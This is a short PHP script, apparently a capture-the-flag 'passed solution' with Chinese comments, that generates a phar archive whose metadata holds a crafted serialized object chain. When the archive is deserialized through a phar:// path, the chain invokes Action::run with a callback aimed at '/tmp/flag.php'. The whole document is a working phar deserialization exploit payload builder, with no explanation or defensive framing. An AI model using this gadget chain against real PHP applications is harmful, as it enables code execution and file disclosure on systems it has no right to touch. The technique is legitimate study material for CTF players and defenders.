<?php

// 通过的解决方案

class Action
{
    protected $checkAccess;
    protected $id;

    public function __construct($checkAccess, $id)
    {
        $this->checkAccess = $checkAccess;
        $this->id = $id;
    }
}

class Show
{
    public $source;
    public $str;
    public $reader;
}

class Content
{
    public $formatters;
    public $providers;
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$action = new Action($checkAccess = "/tmp/flag.php", $id = "0");

$show = new Show();
$show->source = $show;

$content = new Content();
$content->providers = [$show,];
$content->formatters = array('close' => array($action, 'run'));

$show->str = $content;
$show->reader = $content;

$phar->setMetadata($show); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //填充必要的负载数据

//签名自动计算
$phar->stopBuffering();
?>